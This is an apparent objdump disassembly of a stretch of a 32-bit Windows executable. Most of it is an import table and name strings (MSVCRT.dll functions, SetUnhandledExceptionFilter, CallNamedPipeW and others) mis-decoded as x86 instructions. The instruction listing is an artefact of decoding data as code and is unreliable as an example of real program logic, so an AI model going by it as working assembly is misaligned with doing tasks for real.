  41d554:	rcr    cl,1
  41d556:	add    DWORD PTR [eax],eax
  41d558:	loopne 0x41d533
  41d55a:	add    DWORD PTR [eax],eax
  41d55c:	jmp    0x1d9:0xf80001d9
  41d563:	add    BYTE PTR [edx+ebx*8],al
  41d566:	add    DWORD PTR [eax],eax
  41d568:	push   cs
  41d569:	fiadd  DWORD PTR [ecx]
  41d56b:	add    BYTE PTR [edx],bl
  41d56d:	fiadd  DWORD PTR [ecx]
  41d56f:	add    BYTE PTR [edx+ebx*8],ah
  41d572:	add    DWORD PTR [eax],eax
  41d574:	fiadd  DWORD PTR cs:[ecx]
  41d577:	add    BYTE PTR [eax],bh
  41d579:	fiadd  DWORD PTR [ecx]
  41d57b:	add    BYTE PTR [eax-0x26],al
  41d57e:	add    DWORD PTR [eax],eax
  41d580:	dec    esi
  41d581:	fiadd  DWORD PTR [ecx]
  41d583:	add    BYTE PTR [eax-0x26],bl
  41d586:	add    DWORD PTR [eax],eax
  41d588:	fiadd  DWORD PTR fs:[ecx]
  41d58b:	add    BYTE PTR [esi-0x26],ch
  41d58e:	add    DWORD PTR [eax],eax
  41d590:	js     0x41d56c
  41d592:	add    DWORD PTR [eax],eax
  41d594:	xchg   dl,bl
  41d596:	add    DWORD PTR [eax],eax
  41d598:	mov    ds,edx
  41d59a:	add    DWORD PTR [eax],eax
  41d59c:	call   0x1da:0xa40001da
  41d5a3:	add    BYTE PTR [esi-0x47fffe26],ch
  41d5a9:	fiadd  DWORD PTR [ecx]
  41d5ab:	add    ah,cl
  41d5ad:	fiadd  DWORD PTR [ecx]
  41d5af:	add    ah,bl
  41d5b1:	fiadd  DWORD PTR [ecx]
  41d5b3:	add    al,ch
  41d5b5:	fiadd  DWORD PTR [ecx]
  41d5b7:	add    dl,dh
  41d5b9:	fiadd  DWORD PTR [ecx]
  41d5bb:	add    ah,bh
  41d5bd:	fiadd  DWORD PTR [ecx]
  41d5bf:	add    BYTE PTR [eax],al
  41d5c1:	add    BYTE PTR [eax],al
  41d5c3:	add    BYTE PTR [edx],dl
  41d5c5:	fild   DWORD PTR [ecx]
  41d5c7:	add    BYTE PTR [eax],dh
  41d5c9:	fild   DWORD PTR [ecx]
  41d5cb:	add    BYTE PTR [eax-0x25],cl
  41d5ce:	add    DWORD PTR [eax],eax
  41d5d0:	push   0x7a0001db
  41d5d5:	fild   DWORD PTR [ecx]
  41d5d7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d5dd:	fild   DWORD PTR [ecx]
  41d5df:	add    dl,al
  41d5e1:	fild   DWORD PTR [ecx]
  41d5e3:	add    dh,dl
  41d5e5:	fild   DWORD PTR [ecx]
  41d5e7:	add    dh,ah
  41d5e9:	fild   DWORD PTR [ecx]
  41d5eb:	add    BYTE PTR [edx],al
  41d5ed:	fadd   QWORD PTR [ecx]
  41d5ef:	add    BYTE PTR [esp+ebx*8],bl
  41d5f2:	add    DWORD PTR [eax],eax
  41d5f4:	sub    al,0xdc
  41d5f6:	add    DWORD PTR [eax],eax
  41d5f8:	cmp    bl,ah
  41d5fa:	add    DWORD PTR [eax],eax
  41d5fc:	dec    esi
  41d5fd:	fadd   QWORD PTR [ecx]
  41d5ff:	add    BYTE PTR [edx-0x24],bl
  41d602:	add    DWORD PTR [eax],eax
  41d604:	data16 fadd QWORD PTR [ecx]
  41d607:	add    BYTE PTR [eax-0x24],bh
  41d60a:	add    DWORD PTR [eax],eax
  41d60c:	mov    bl,ah
  41d60e:	add    DWORD PTR [eax],eax
  41d610:	pushf  
  41d611:	fadd   QWORD PTR [ecx]
  41d613:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d619:	fadd   QWORD PTR [ecx]
  41d61b:	add    ah,cl
  41d61d:	fadd   QWORD PTR [ecx]
  41d61f:	add    al,ah
  41d621:	fadd   QWORD PTR [ecx]
  41d623:	add    ah,dh
  41d625:	fadd   QWORD PTR [ecx]
  41d627:	add    BYTE PTR [esi],al
  41d629:	fld    QWORD PTR [ecx]
  41d62b:	add    BYTE PTR [esi],dl
  41d62d:	fld    QWORD PTR [ecx]
  41d62f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d636:	add    DWORD PTR [eax],eax
  41d638:	dec    edx
  41d639:	fld    QWORD PTR [ecx]
  41d63b:	add    BYTE PTR [eax-0x23],bl
  41d63e:	add    DWORD PTR [eax],eax
  41d640:	pusha  
  41d641:	fld    QWORD PTR [ecx]
  41d643:	add    BYTE PTR [esi-0x23],ch
  41d646:	add    DWORD PTR [eax],eax
  41d648:	test   ch,bl
  41d64a:	add    DWORD PTR [eax],eax
  41d64c:	mov    ds,ebp
  41d64e:	add    DWORD PTR [eax],eax
  41d650:	sahf   
  41d651:	fld    QWORD PTR [ecx]
  41d653:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d65a:	add    DWORD PTR [eax],eax
  41d65c:	fcmovu st,st(5)
  41d65e:	add    DWORD PTR [eax],eax
  41d660:	out    dx,al
  41d661:	fld    QWORD PTR [ecx]
  41d663:	add    ah,bh
  41d665:	fld    QWORD PTR [ecx]
  41d667:	add    BYTE PTR [eax],cl
  41d669:	fiadd  WORD PTR [ecx]
  41d66b:	add    BYTE PTR [eax],ah
  41d66d:	fiadd  WORD PTR [ecx]
  41d66f:	add    BYTE PTR [edx],dh
  41d671:	fiadd  WORD PTR [ecx]
  41d673:	add    BYTE PTR [edx-0x22],cl
  41d676:	add    DWORD PTR [eax],eax
  41d678:	pop    esp
  41d679:	fiadd  WORD PTR [ecx]
  41d67b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d67f:	add    BYTE PTR [edx-0x71fffe22],al
  41d685:	fiadd  WORD PTR [ecx]
  41d687:	add    BYTE PTR [edx+0x1de],ah
  41d68d:	add    BYTE PTR [eax],al
  41d68f:	add    al,al
  41d691:	fiadd  WORD PTR [ecx]
  41d693:	add    dl,cl
  41d695:	fiadd  WORD PTR [ecx]
  41d697:	add    ah,dl
  41d699:	fiadd  WORD PTR [ecx]
  41d69b:	add    al,ah
  41d69d:	fiadd  WORD PTR [ecx]
  41d69f:	add    ah,dh
  41d6a1:	fiadd  WORD PTR [ecx]
  41d6a3:	add    BYTE PTR [eax],al
  41d6a5:	fild   WORD PTR [ecx]
  41d6a7:	add    BYTE PTR [edx],bl
  41d6a9:	fild   WORD PTR [ecx]
  41d6ab:	add    BYTE PTR [edx],ch
  41d6ad:	fild   WORD PTR [ecx]
  41d6af:	add    BYTE PTR [eax],bh
  41d6b1:	fild   WORD PTR [ecx]
  41d6b3:	add    BYTE PTR [eax-0x21],dl
  41d6b6:	add    DWORD PTR [eax],eax
  41d6b8:	fild   WORD PTR fs:[ecx]
  41d6bb:	add    BYTE PTR [esi-0x21],bh
  41d6be:	add    DWORD PTR [eax],eax
  41d6c0:	mov    edi,ds
  41d6c2:	add    DWORD PTR [eax],eax
  41d6c4:	cwde   
  41d6c5:	fild   WORD PTR [ecx]
  41d6c7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d6cd:	fild   WORD PTR [ecx]
  41d6cf:	add    dh,al
  41d6d1:	fild   WORD PTR [ecx]
  41d6d3:	add    dh,dl
  41d6d5:	fild   WORD PTR [ecx]
  41d6d7:	add    dh,ah
  41d6d9:	fild   WORD PTR [ecx]
  41d6db:	add    ah,bh
  41d6dd:	fild   WORD PTR [ecx]
  41d6df:	add    BYTE PTR [eax],cl
  41d6e1:	loopne 0x41d6e4
  41d6e3:	add    BYTE PTR [eax+eiz*8],dl
  41d6e6:	add    DWORD PTR [eax],eax
  41d6e8:	sub    al,ah
  41d6ea:	add    DWORD PTR [eax],eax
  41d6ec:	ds loopne 0x41d6f0
  41d6ef:	add    BYTE PTR [esi-0x20],dl
  41d6f2:	add    DWORD PTR [eax],eax
  41d6f4:	data16 loopne 0x41d6f8
  41d6f7:	add    BYTE PTR [edx-0x20],dh
  41d6fa:	add    DWORD PTR [eax],eax
  41d6fc:	xchg   al,ah
  41d6fe:	add    DWORD PTR [eax],eax
  41d700:	xchg   esp,eax
  41d701:	loopne 0x41d704
  41d703:	add    BYTE PTR [esi-0x47fffe20],ch
  41d709:	loopne 0x41d70c
  41d70b:	add    dl,cl
  41d70d:	loopne 0x41d710
  41d70f:	add    ah,bl
  41d711:	loopne 0x41d714
  41d713:	add    dh,ch
  41d715:	loopne 0x41d718
  41d717:	add    dh,bh
  41d719:	loopne 0x41d71c
  41d71b:	add    BYTE PTR [eax],cl
  41d71d:	loope  0x41d720
  41d71f:	add    BYTE PTR [esi],bl
  41d721:	loope  0x41d724
  41d723:	add    BYTE PTR [edx],dh
  41d725:	loope  0x41d728
  41d727:	add    BYTE PTR [esi-0x1f],al
  41d72a:	add    DWORD PTR [eax],eax
  41d72c:	push   esi
  41d72d:	loope  0x41d730
  41d72f:	add    BYTE PTR [esi-0x1f],ah
  41d732:	add    DWORD PTR [eax],eax
  41d734:	jb     0x41d717
  41d736:	add    DWORD PTR [eax],eax
  41d738:	test   cl,ah
  41d73a:	add    DWORD PTR [eax],eax
  41d73c:	mov    al,ds:0xb60001e1
  41d741:	loope  0x41d744
  41d743:	add    dl,al
  41d745:	loope  0x41d748
  41d747:	add    dh,dl
  41d749:	loope  0x41d74c
  41d74b:	add    BYTE PTR [eax],al
  41d74d:	add    BYTE PTR [eax],al
  41d74f:	add    ah,dh
  41d751:	loope  0x41d754
  41d753:	add    BYTE PTR [edx+eiz*8],al
  41d756:	add    DWORD PTR [eax],eax
  41d758:	adc    al,0xe2
  41d75a:	add    DWORD PTR [eax],eax
  41d75c:	and    ah,dl
  41d75e:	add    DWORD PTR [eax],eax
  41d760:	xor    dl,ah
  41d762:	add    DWORD PTR [eax],eax
  41d764:	ds loop 0x41d768
  41d767:	add    BYTE PTR [edx-0x1e],dl
  41d76a:	add    DWORD PTR [eax],eax
  41d76c:	pusha  
  41d76d:	loop   0x41d770
  41d76f:	add    BYTE PTR [edx-0x1e],bh
  41d772:	add    DWORD PTR [eax],eax
  41d774:	xchg   dl,ah
  41d776:	add    DWORD PTR [eax],eax
  41d778:	cwde   
  41d779:	loop   0x41d77c
  41d77b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d782:	add    DWORD PTR [eax],eax
  41d784:	int3   
  41d785:	loop   0x41d788
  41d787:	add    dh,dl
  41d789:	loop   0x41d78c
  41d78b:	add    al,ah
  41d78d:	loop   0x41d790
  41d78f:	add    dl,bh
  41d791:	loop   0x41d794
  41d793:	add    BYTE PTR [edx],cl
  41d795:	jecxz  0x41d798
  41d797:	add    BYTE PTR [edx],bl
  41d799:	jecxz  0x41d79c
  41d79b:	add    BYTE PTR [ebx+eiz*8],ah
  41d79e:	add    DWORD PTR [eax],eax
  41d7a0:	xor    al,0xe3
  41d7a2:	add    DWORD PTR [eax],eax
  41d7a4:	inc    eax
  41d7a5:	jecxz  0x41d7a8
  41d7a7:	add    BYTE PTR [esi-0x1d],cl
  41d7aa:	add    DWORD PTR [eax],eax
  41d7ac:	fs jecxz 0x41d7b0
  41d7af:	add    BYTE PTR [esi-0x1d],dh
  41d7b2:	add    DWORD PTR [eax],eax
  41d7b4:	mov    fs,ebx
  41d7b6:	add    DWORD PTR [eax],eax
  41d7b8:	mov    ds:0xb00001e3,al
  41d7bd:	jecxz  0x41d7c0
  41d7bf:	add    dl,al
  41d7c1:	jecxz  0x41d7c4
  41d7c3:	add    dh,cl
  41d7c5:	jecxz  0x41d7c8
  41d7c7:	add    dh,bl
  41d7c9:	jecxz  0x41d7cc
  41d7cb:	add    ah,ch
  41d7cd:	jecxz  0x41d7d0
  41d7cf:	add    BYTE PTR [eax],al
  41d7d1:	in     al,0x1
  41d7d3:	add    BYTE PTR [esi],cl
  41d7d5:	in     al,0x1
  41d7d7:	add    BYTE PTR [edx],ch
  41d7d9:	in     al,0x1
  41d7db:	add    BYTE PTR [esp+eiz*8],bh
  41d7de:	add    DWORD PTR [eax],eax
  41d7e0:	dec    esp
  41d7e1:	in     al,0x1
  41d7e3:	add    BYTE PTR [esi-0x1c],bl
  41d7e6:	add    DWORD PTR [eax],eax
  41d7e8:	push   0xffffffe4
  41d7ea:	add    DWORD PTR [eax],eax
  41d7ec:	jl     0x41d7d2
  41d7ee:	add    DWORD PTR [eax],eax
  41d7f0:	mov    ah,ah
  41d7f2:	add    DWORD PTR [eax],eax
  41d7f4:	cwde   
  41d7f5:	in     al,0x1
  41d7f7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d7fd:	in     al,0x1
  41d7ff:	add    al,dl
  41d801:	in     al,0x1
  41d803:	add    dl,ah
  41d805:	in     al,0x1
  41d807:	add    al,dh
  41d809:	in     al,0x1
  41d80b:	add    BYTE PTR [eax],cl
  41d80d:	in     eax,0x1
  41d80f:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d816:	add    DWORD PTR [eax],eax
  41d818:	ds in  eax,0x1
  41d81b:	add    BYTE PTR [edx-0x1b],cl
  41d81e:	add    DWORD PTR [eax],eax
  41d820:	pop    edx
  41d821:	in     eax,0x1
  41d823:	add    BYTE PTR [esi-0x1b],ch
  41d826:	add    DWORD PTR [eax],eax
  41d828:	jle    0x41d80f
  41d82a:	add    DWORD PTR [eax],eax
  41d82c:	nop
  41d82d:	in     eax,0x1
  41d82f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d836:	add    DWORD PTR [eax],eax
  41d838:	mov    eax,0xca0001e5
  41d83d:	in     eax,0x1
  41d83f:	add    dl,bl
  41d841:	in     eax,0x1
  41d843:	add    dh,ah
  41d845:	in     eax,0x1
  41d847:	add    ah,bh
  41d849:	in     eax,0x1
  41d84b:	add    BYTE PTR [esi],cl
  41d84d:	out    0x1,al
  41d84f:	add    BYTE PTR [eax],ch
  41d851:	out    0x1,al
  41d853:	add    BYTE PTR [edx],bh
  41d855:	out    0x1,al
  41d857:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d85b:	add    BYTE PTR [eax-0x1a],bl
  41d85e:	add    DWORD PTR [eax],eax
  41d860:	push   0x7a0001e6
  41d865:	out    0x1,al
  41d867:	add    BYTE PTR [esi-0x67fffe1a],al
  41d86d:	out    0x1,al
  41d86f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d875:	out    0x1,al
  41d877:	add    ah,bl
  41d879:	out    0x1,al
  41d87b:	add    dl,ch
  41d87d:	out    0x1,al
  41d87f:	add    al,bh
  41d881:	out    0x1,al
  41d883:	add    BYTE PTR [esi],cl
  41d885:	out    0x1,eax
  41d887:	add    BYTE PTR [esi],bl
  41d889:	out    0x1,eax
  41d88b:	add    BYTE PTR [edx],ch
  41d88d:	out    0x1,eax
  41d88f:	add    BYTE PTR [edx],bh
  41d891:	out    0x1,eax
  41d893:	add    BYTE PTR [edx-0x19],cl
  41d896:	add    DWORD PTR [eax],eax
  41d898:	pop    esp
  41d899:	out    0x1,eax
  41d89b:	add    BYTE PTR [eax-0x19],ch
  41d89e:	add    DWORD PTR [eax],eax
  41d8a0:	jbe    0x41d889
  41d8a2:	add    DWORD PTR [eax],eax
  41d8a4:	xchg   bh,ah
  41d8a6:	add    DWORD PTR [eax],eax
  41d8a8:	cwde   
  41d8a9:	out    0x1,eax
  41d8ab:	add    BYTE PTR [eax-0x45fffe19],ch
  41d8b1:	out    0x1,eax
  41d8b3:	add    al,dl
  41d8b5:	out    0x1,eax
  41d8b7:	add    dh,ah
  41d8b9:	out    0x1,eax
  41d8bb:	add    dh,dh
  41d8bd:	out    0x1,eax
  41d8bf:	add    BYTE PTR [edx],al
  41d8c1:	call   0xe859d8c7
  41d8c6:	add    DWORD PTR [eax],eax
  41d8c8:	and    al,0xe8
  41d8ca:	add    DWORD PTR [eax],eax
  41d8cc:	xor    al,0xe8
  41d8ce:	add    DWORD PTR [eax],eax
  41d8d0:	dec    eax
  41d8d1:	call   0xe897d8d7
  41d8d6:	add    DWORD PTR [eax],eax
  41d8d8:	callw  0xd8dd
  41d8dc:	jp     0x41d8c6
  41d8de:	add    DWORD PTR [eax],eax
  41d8e0:	xchg   al,ch
  41d8e2:	add    DWORD PTR [eax],eax
  41d8e4:	xchg   esi,eax
  41d8e5:	call   0xe8e3d8eb
  41d8ea:	add    DWORD PTR [eax],eax
  41d8ec:	mov    dl,0xe8
  41d8ee:	add    DWORD PTR [eax],eax
  41d8f0:	(bad)  
  41d8f1:	call   0xe913d8f7
  41d8f6:	add    DWORD PTR [eax],eax
  41d8f8:	in     al,0xe8
  41d8fa:	add    DWORD PTR [eax],eax
  41d8fc:	lock call 0xe93fd903
  41d902:	add    DWORD PTR [eax],eax
  41d904:	or     al,0xe9
  41d906:	add    DWORD PTR [eax],eax
  41d908:	sbb    ch,cl
  41d90a:	add    DWORD PTR [eax],eax
  41d90c:	add    BYTE PTR [eax],al
  41d90e:	add    BYTE PTR [eax],al
  41d910:	or     al,0x2
  41d912:	add    BYTE PTR [eax+0x0],al
  41d918:	cmc    
  41d919:	add    BYTE PTR [edi+0x63],bl
  41d91c:	outs   dx,DWORD PTR ds:[esi]
  41d91d:	outs   dx,BYTE PTR ds:[esi]
  41d91e:	je     0x41d992
  41d920:	outs   dx,DWORD PTR ds:[esi]
  41d921:	ins    BYTE PTR es:[edi],dx
  41d922:	data16 jo 0x41d925
  41d925:	add    BYTE PTR [ebx],al
  41d927:	add    al,0x73
  41d929:	jns    0x41d99e
  41d92b:	je     0x41d992
  41d92d:	ins    DWORD PTR es:[edi],dx
  41d92e:	add    BYTE PTR [eax],al
  41d930:	fwait
  41d931:	add    ebp,DWORD PTR [ecx+0x73]
  41d934:	jo     0x41d9a8
  41d936:	imul   ebp,DWORD PTR [esi+0x74],0x61035a00
  41d93d:	je     0x41d9ae
  41d93f:	ins    BYTE PTR es:[edi],dx
  41d940:	add    BYTE PTR [eax],al
  41d942:	jmp    0x7363:0x72747303
  41d949:	jo     0x41d9b9
  41d94b:	add    BYTE PTR [edi+0x73626d03],dh
  41d951:	je     0x41d9c2
  41d953:	ja     0x41d9b8
  41d955:	jae    0x41d957
  41d957:	add    bh,ah
  41d959:	add    esi,DWORD PTR [ebx+0x74]
  41d95c:	jb     0x41d9c1
  41d95e:	outs   dx,DWORD PTR ds:[esi]
  41d95f:	ins    BYTE PTR es:[edi],dx
  41d960:	ins    BYTE PTR es:[edi],dx
  41d961:	add    ch,al
  41d963:	add    esi,DWORD PTR [eax+0x72]
  41d966:	imul   ebp,DWORD PTR [esi+0x74],0xb000066
  41d96d:	add    al,0x74
  41d96f:	outs   dx,DWORD PTR ds:[esi]
  41d970:	ja     0x41d9de
  41d972:	outs   dx,DWORD PTR ds:[esi]
  41d973:	ja     0x41d9da
  41d975:	jb     0x41d977
  41d977:	add    BYTE PTR [esi],al
  41d979:	add    al,0x74
  41d97b:	imul   ebp,DWORD PTR [ebp+0x65],0x36d0000
  41d982:	data16 addr16 gs je 0x41d9ea
  41d987:	add    BYTE PTR [ebx+0x735f5f00],dh
  41d98d:	gs je  0x41d9ef
  41d990:	popa   
  41d991:	jo     0x41da03
  41d993:	pop    edi
  41d994:	je     0x41da0f
  41d996:	jo     0x41d9fd
  41d998:	add    BYTE PTR [eax],al
  41d99a:	mov    al,ds:0x705f5f00
  41d99f:	pop    edi
  41d9a0:	pop    edi
  41d9a1:	ins    WORD PTR es:[edi],dx
  41d9a3:	outs   dx,DWORD PTR ds:[esi]
  41d9a4:	fs add BYTE PTR gs:[eax],al
  41d9a8:	xchg   esp,eax
  41d9a9:	add    ebp,DWORD PTR [ecx+0x73]
  41d9ac:	popa   
  41d9ad:	ins    BYTE PTR es:[edi],dx
  41d9ae:	outs   dx,BYTE PTR ds:[esi]
  41d9af:	jne    0x41da1e
  41d9b1:	add    dl,bh
  41d9b3:	add    esi,DWORD PTR [ebx+0x74]
  41d9b6:	jb     0x41da2c
  41d9b8:	outs   dx,DWORD PTR ds:[esi]
  41d9b9:	imul   eax,DWORD PTR [eax],0x0
  41d9bc:	sbb    al,0x4
  41d9be:	ja     0x41da23
  41d9c0:	jae    0x41da25
  41d9c2:	popa   
  41d9c3:	je     0x41d9c5
  41d9c5:	add    BYTE PTR [ecx+0x74626d03],bh
  41d9cb:	outs   dx,DWORD PTR ds:[esi]
  41d9cc:	ja     0x41da31
  41d9ce:	add    BYTE PTR [eax],al
  41d9d0:	fwait
  41d9d1:	add    BYTE PTR [edi+0x5f],bl
  41d9d4:	jo     0x41da35
  41d9d6:	pop    edi
  41d9d7:	arpl   WORD PTR [edi+0x6d],bp
  41d9da:	ins    DWORD PTR es:[edi],dx
  41d9db:	outs   dx,DWORD PTR ds:[esi]
  41d9dc:	fs add BYTE PTR gs:[eax],al
  41d9e0:	loope  0x41d9e5
  41d9e2:	jae    0x41da57
  41d9e4:	arpl   WORD PTR [ecx+0x6e],sp
  41d9e7:	data16 add BYTE PTR [eax],al
  41d9ea:	fild   DWORD PTR [eax]
  41d9ec:	pop    edi
  41d9ed:	popa   
  41d9ee:	ins    DWORD PTR es:[edi],dx
  41d9ef:	jae    0x41da58
  41d9f1:	pop    edi
  41d9f2:	gs js  0x41da5e
  41d9f5:	je     0x41d9f7
  41d9f7:	add    BYTE PTR [esi+0x6e695f01],al
  41d9fd:	imul   esi,DWORD PTR [esp+esi*2+0x65],0xc8006d72
  41da05:	add    esi,DWORD PTR [eax+0x75]
  41da08:	je     0x41da6d
  41da0a:	push   0xb1007261
  41da0f:	add    ebp,DWORD PTR [edi+ebp*2+0x63]
  41da13:	popa   
  41da14:	ins    BYTE PTR es:[edi],dx
  41da15:	je     0x41da80
  41da17:	ins    DWORD PTR es:[edi],dx
  41da18:	add    BYTE PTR gs:[ecx+0x3],ch
  41da1c:	data16 arpl WORD PTR [edi+ebp*2+0x73],bp
  41da21:	add    BYTE PTR gs:[eax],al
  41da24:	or     eax,0x676e7504
  41da29:	gs je  0x41da8f
  41da2c:	add    BYTE PTR [eax],al
  41da2e:	sub    DWORD PTR [edi+esi*2],eax
  41da31:	arpl   WORD PTR [ebx+0x6e],si
  41da34:	arpl   WORD PTR [eax+0x79],si
  41da37:	add    bh,cl
  41da39:	add    esi,DWORD PTR [edx+0x61]
  41da3c:	outs   dx,BYTE PTR ds:[esi]
  41da3d:	add    BYTE PTR fs:[eax],al
  41da40:	sahf   
  41da41:	add    DWORD PTR [edi+0x69],ebx
  41da44:	jae    0x41dab3
  41da46:	bound  esp,QWORD PTR [edx+0x6c]
  41da49:	gs popa 
  41da4b:	add    BYTE PTR fs:[eax],al
  41da4e:	add    DWORD PTR [ebx+esi*2],eax
  41da51:	ja     0x41dac6
  41da53:	arpl   WORD PTR [ecx+0x6e],sp
  41da56:	data16 add BYTE PTR [ebx+0x77736903],ch
  41da5d:	js     0x41dac3
  41da5f:	imul   esp,DWORD PTR [edi+0x69],0x4280074
  41da66:	ja     0x41dacb
  41da68:	jae    0x41dad8
  41da6a:	arpl   WORD PTR [ebp+0x70],bp
  41da6d:	add    BYTE PTR [esi+0x75736903],bl
  41da73:	jo     0x41dae5
  41da75:	gs jb  0x41da78
  41da78:	push   edx
  41da79:	add    BYTE PTR [edi+0x58],bl
  41da7c:	arpl   WORD PTR [eax+0x74],si
  41da7f:	inc    esi
  41da80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x1230072
  41da88:	pop    edi
  41da89:	gs js  0x41daf5
  41da8c:	je     0x41da8e
  41da8e:	sbb    BYTE PTR [esi+esi*2],al
  41da91:	jae    0x41db0a
  41da93:	jo     0x41db07
  41da95:	imul   ebp,DWORD PTR [esi+0x74],0xe80066
  41da9c:	pop    edi
  41da9d:	arpl   WORD PTR [ebp+0x78],sp
  41daa0:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x7362035b
  41daa8:	gs popa 
  41daaa:	jb     0x41db0f
  41daac:	push   0x7303e800
  41dab1:	je     0x41db25
  41dab3:	arpl   WORD PTR [eax+0x79],si
  41dab6:	add    BYTE PTR [eax],al
  41dab8:	mov    ch,0x0
  41daba:	pop    edi
  41dabb:	pop    edi
  41dabc:	jae    0x41db23
  41dabe:	je     0x41db35
  41dac0:	jae    0x41db27
  41dac2:	jb     0x41db31
  41dac4:	popa   
  41dac5:	je     0x41db2f
  41dac7:	gs jb  0x41db3c
  41daca:	add    BYTE PTR [eax],al
  41dacc:	jb     0x41dace
  41dace:	pop    edi
  41dacf:	pop    edi
  41dad0:	addr16 gs je 0x41db41
  41dad4:	popa   
  41dad5:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  41dadc:	pop    edi
  41dadd:	add    esp,DWORD PTR [ebx+0x6c]
  41dae0:	gs popa 
  41dae2:	jb     0x41db49
  41dae4:	jb     0x41db58
  41dae6:	add    BYTE PTR [eax],al
  41dae8:	and    DWORD PTR [edi+esi*2],eax
  41daeb:	arpl   WORD PTR [ebx+0x63],si
  41daee:	jo     0x41db69
  41daf0:	add    BYTE PTR [eax],al
  41daf2:	std    
  41daf3:	add    esi,DWORD PTR [ebx+0x74]
  41daf6:	jb     0x41db6c
  41daf8:	outs   dx,DWORD PTR ds:[esi]
  41daf9:	jne    0x41db67
  41dafb:	add    bl,al
  41dafd:	add    esi,DWORD PTR [eax+0x65]
  41db00:	jb     0x41db74
  41db02:	outs   dx,DWORD PTR ds:[esi]
  41db03:	jb     0x41db05
  41db05:	add    BYTE PTR [ebp+0x53],cl
  41db08:	push   esi
  41db09:	inc    ebx
  41db0a:	push   edx
  41db0b:	push   esp
  41db0c:	cs fs ins BYTE PTR es:[edi],dx
  41db0f:	ins    BYTE PTR es:[edi],dx
  41db10:	add    BYTE PTR [eax],al
  41db12:	inc    ecx
  41db13:	add    al,0x53
  41db15:	gs je  0x41db6d
  41db18:	outs   dx,BYTE PTR ds:[esi]
  41db19:	push   0x6c646e61
  41db1e:	gs fs inc ebp
  41db21:	js     0x41db86
  41db23:	gs jo  0x41db9a
  41db26:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  41db2d:	gs jb  0x41db30
  41db30:	jmp    0x6946:0x74654701
  41db37:	ins    BYTE PTR es:[edi],dx
  41db38:	gs inc ecx
  41db3a:	je     0x41dbb0
  41db3c:	jb     0x41dba7
  41db3e:	bound  esi,QWORD PTR [ebp+0x74]
  41db41:	gs jae 0x41db89
  41db44:	js     0x41db87
  41db46:	add    BYTE PTR [eax],al
  41db48:	pop    esp
  41db49:	add    DWORD PTR [esi+0x69],eax
  41db4c:	outs   dx,BYTE PTR ds:[esi]
  41db4d:	fs inc esi
  41db4f:	imul   esi,DWORD PTR [edx+0x73],0x61684374
  41db56:	outs   dx,BYTE PTR ds:[esi]
  41db57:	addr16 gs dec esi
  41db5a:	outs   dx,DWORD PTR ds:[esi]
  41db5b:	je     0x41dbc6
  41db5d:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41db63:	outs   dx,DWORD PTR ds:[esi]
  41db64:	outs   dx,BYTE PTR ds:[esi]
  41db65:	push   edi
  41db66:	add    BYTE PTR [eax],al
  41db68:	mov    ds:0x6c614300,al
  41db6d:	ins    BYTE PTR es:[edi],dx
  41db6e:	dec    esi
  41db6f:	popa   
  41db70:	ins    DWORD PTR es:[edi],dx
  41db71:	gs fs push eax
  41db74:	imul   esi,DWORD PTR [eax+0x65],0xdb000057
  41db7b:	add    cl,BYTE PTR [ecx+0x73]
  41db7e:	push   esi
  41db7f:	popa   
  41db80:	ins    BYTE PTR es:[edi],dx
  41db81:	imul   esp,DWORD PTR [esp+ecx*2+0x6f],0x656c6163
  41db89:	add    BYTE PTR [ebp+0x1],ah
  41db8c:	inc    esi
  41db8d:	imul   ebp,DWORD PTR [esi+0x64],0x7478654e
  41db94:	inc    ebx
  41db95:	push   0x65676e61
  41db9a:	dec    esi
  41db9b:	outs   dx,DWORD PTR ds:[esi]
  41db9c:	je     0x41dc07
  41db9e:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41dba4:	outs   dx,DWORD PTR ds:[esi]
  41dba5:	outs   dx,BYTE PTR ds:[esi]
  41dba6:	add    BYTE PTR [eax],al
  41dba8:	cmp    BYTE PTR [ebx+edx*2],al
  41dbab:	gs je  0x41dc02
  41dbae:	push   0x64616572
  41dbb3:	inc    ebp
  41dbb4:	js     0x41dc1b
  41dbb6:	arpl   WORD PTR [ebp+0x74],si
  41dbb9:	imul   ebp,DWORD PTR [edi+0x6e],0x74617453
  41dbc0:	add    BYTE PTR gs:[esi],bl
  41dbc3:	add    al,BYTE PTR [edi+0x65]
  41dbc6:	je     0x41dc18
  41dbc8:	jb     0x41dc33
  41dbca:	outs   dx,DWORD PTR ds:[esi]
  41dbcb:	jb     0x41dc36
  41dbcd:	je     0x41dc48
  41dbcf:	inc    ebx
  41dbd0:	ins    BYTE PTR es:[edi],dx
  41dbd1:	popa   
  41dbd2:	jae    0x41dc47
  41dbd4:	add    BYTE PTR [eax],al
  41dbd6:	add    DWORD PTR [bp+0x69],eax
  41dbda:	outs   dx,BYTE PTR ds:[esi]
  41dbdb:	fs dec esi
  41dbdd:	gs js  0x41dc54
  41dbe0:	inc    esi
  41dbe1:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x57048d00
  41dbe9:	popa   
  41dbea:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41dbf2:	je     0x41dc5d
  41dbf4:	jo     0x41dc62
  41dbf6:	gs dec edi
  41dbf8:	bound  ebp,QWORD PTR [edx+0x65]
  41dbfb:	arpl   WORD PTR [ebx+esi*2+0x45],si
  41dbff:	js     0x41dc01
  41dc01:	add    BYTE PTR [edi],ah
  41dc03:	add    al,0x53
  41dc05:	gs je  0x41dc56
  41dc08:	popa   
  41dc09:	ins    DWORD PTR es:[edi],dx
  41dc0a:	gs fs push eax
  41dc0d:	imul   esi,DWORD PTR [eax+0x65],0x646e6148
